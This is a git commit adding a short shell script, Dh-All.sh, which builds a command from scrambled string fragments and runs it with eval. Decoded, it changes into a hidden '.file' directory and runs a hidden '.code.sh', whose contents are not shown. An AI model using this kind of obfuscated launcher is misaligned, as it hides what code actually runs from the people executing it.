5d6928f343eb90ce59ecfddda13254188bc0c2a9
yaminkldon <50974555+yaminkldon@users.noreply.github.com>
2021-05-23 15:36:49 +0400

    Add files via upload

---
+++ Dh-All.sh
@@ -0,0 +1,4 @@
+# -*- coding: utf-8 -*-
+z="
+";Kz='e.sh';Iz='ash ';Az='cd &';Bz='& cd';Dz='All ';Fz='d .f';Ez='&& c';Gz='ile ';Hz='&& b';Jz='.cod';Cz=' Dh-';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz"
